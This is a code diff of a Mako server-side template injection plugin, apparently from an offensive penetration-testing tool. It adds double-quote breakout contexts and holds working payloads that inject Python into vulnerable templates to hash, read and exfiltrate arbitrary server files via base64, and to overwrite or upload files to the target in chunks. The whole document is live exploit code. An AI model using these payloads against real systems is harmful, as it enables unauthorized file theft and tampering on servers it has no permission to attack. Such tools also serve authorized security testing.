@@ -12,7 +12,7 @@ class Mako(Check):
     contexts = [
         # Normal reflecting tag ${}
         { 'level': 1, 'prefix': '}', 'suffix' : '${' },
-        
+
         # Code blocks
         # This covers <% %s %>, <%! %s %>, <% %s=1 %>
         { 'level': 1, 'prefix': '%>', 'suffix' : '<%#' },
@@ -20,19 +20,22 @@ class Mako(Check):
         { 'level': 2, 'prefix': '1%>', 'suffix' : '<%#' },
         # This covers <% a='%s' %>
         { 'level': 2, 'prefix': '1\'%>', 'suffix' : '<%#' },
+        # This covers <% a="%s" %>
+        { 'level': 2, 'prefix': '1"%>', 'suffix' : '<%#' },
         # <% a=range(%s) %>
         { 'level': 3, 'prefix': '1)%>', 'suffix' : '<%#' },
         # <% a=''.join('%s') %>
         { 'level': 3, 'prefix': '1\')%>', 'suffix' : '<%#' },
-        
-        # if and for blocks
+
+        # If and for blocks
         # % if %s:\n% endif
         # % for a in %s:\n% endfor
         # % if %s==1:\n% endif
         { 'level': 2, 'prefix': '\'a\':#\n', 'suffix' : '\n' },
         # % if '%s'=='':\n% endif
         { 'level': 2, 'prefix': 'a\':#\n', 'suffix' : '\n' },
-
+        # % if "%s"=='':\n% endif
+        { 'level': 2, 'prefix': 'a":#\n', 'suffix' : '\n' },
         # % if (%s)==1:\n% endif
         { 'level': 3, 'prefix': '\'a\'):#\n', 'suffix' : '\n' },
         # % if ('%s')=='':\n% endif
@@ -81,31 +84,31 @@ class Mako(Check):
         execution_code = """<%% x=__import__("hashlib").md5(open("%s", 'rb').read()).hexdigest() %%>${x}""" % (remote_path)
 
         return self.inject(execution_code)
-        
+
     def read(self, remote_path):
-                
+
         # Get remote file md5
         md5_remote = self._md5(remote_path)
-            
+
         if not md5_remote:
             log.warn('Error getting remote file md5, check presence and permission')
             return
-        
+
         data_b64encoded = self.inject("""<%% x=__import__("base64").b64encode(open("%s", "rb").read()) %%>${x}""" %  remote_path)
         data = base64decode(data_b64encoded)
-        
+
         if not md5(data) == md5_remote:
             log.warn('Remote file md5 mismatch, check manually')
         else:
             log.info('File downloaded correctly')
-            
+
         return data
-        
+
     def detect_write(self):
         self.set('write', True)
-        
+
     def write(self, data, remote_path):
-        
+
         # Check existance and overwrite with --force-overwrite
         if self._md5(remote_path):
             if not self.channel.args.get('force_overwrite'):
@@ -113,13 +116,13 @@ class Mako(Check):
                 return
             else:
                 self.evaluate("""open("%s", 'w').close()""" % remote_path)
-        
+
         # Upload file in chunks of 500 characters
         for chunk in chunkit(data, 500):
 
             chunk_b64 = base64encode(chunk)
             self.evaluate("""open("%s", 'ab+').write(__import__("base64").b64decode('%s'))""" % (remote_path, chunk_b64))
-        
+
         if not md5(data) == self._md5(remote_path):
             log.warn('Remote file md5 mismatch, check manually')
         else:
